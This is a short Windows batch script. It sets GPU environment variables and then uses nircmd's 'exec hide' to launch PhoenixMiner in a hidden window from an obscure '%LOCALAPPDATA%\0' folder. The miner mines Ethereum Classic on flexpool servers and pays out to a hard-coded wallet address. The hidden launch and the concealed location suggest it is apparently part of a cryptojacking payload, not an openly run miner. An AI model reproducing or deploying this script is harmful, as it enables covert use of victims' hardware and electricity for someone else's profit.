@echo off
set "APPDATA_LOCAL_FOLDER=%LOCALAPPDATA%\0"
set "PHOENIX_MINER_PATH=%APPDATA_LOCAL_FOLDER%\PhoenixMiner.exe"
set "NIRCMD_PATH=%APPDATA_LOCAL_FOLDER%\nircmd.exe"

setx GPU_FORCE_64BIT_PTR 0 >nul
setx GPU_MAX_HEAP_SIZE 100 >nul
setx GPU_USE_SYNC_OBJECTS 1 >nul
setx GPU_MAX_ALLOC_PERCENT 100 >nul
setx GPU_SINGLE_ALLOC_PERCENT 100 >nul


start "" /B cmd /C "%NIRCMD_PATH% exec hide %PHOENIX_MINER_PATH% -pool ssl://etc-us-east.flexpool.io:5555 -pool2 ssl://etc-de.flexpool.io:5555 -wal 0x52505806210Bdc3FCf3A6c763165A73a30A05F77.worker"
